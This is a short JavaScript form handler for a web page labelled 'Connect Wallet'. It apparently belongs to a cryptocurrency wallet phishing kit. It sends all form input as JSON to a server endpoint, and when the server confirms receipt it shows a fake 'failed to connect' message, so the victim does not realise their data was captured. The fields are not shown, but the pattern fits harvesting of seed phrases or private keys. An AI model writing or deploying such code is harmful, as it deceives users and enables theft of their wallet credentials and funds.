const form = document.getElementById("my-form");
const submitButton = document.getElementById("submit");

form.addEventListener("submit", async function (event) {
    event.preventDefault();

    submitButton.disabled = true;
    submitButton.textContent = "Connecting...";

    const formData = new FormData(form);
    const data = Object.fromEntries(formData.entries());

    try {
        const response = await fetch("/api/states", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(data)
        });

        const result = await response.json();

        if (result.success) {
    submitButton.textContent = "Connecting...";

    setTimeout(function () {
        $("#div_connect_manuallly").hide();
        $("#failed_to_connect").show();

        submitButton.disabled = false;
        submitButton.textContent = "Connect Wallet";
    }, 700);
}
        

    } catch (error) {
        console.error("Submission error:", error);
        alert("Something went wrong. Please try again.");
    }

    submitButton.disabled = false;
    submitButton.textContent = "Connect Wallet";
});
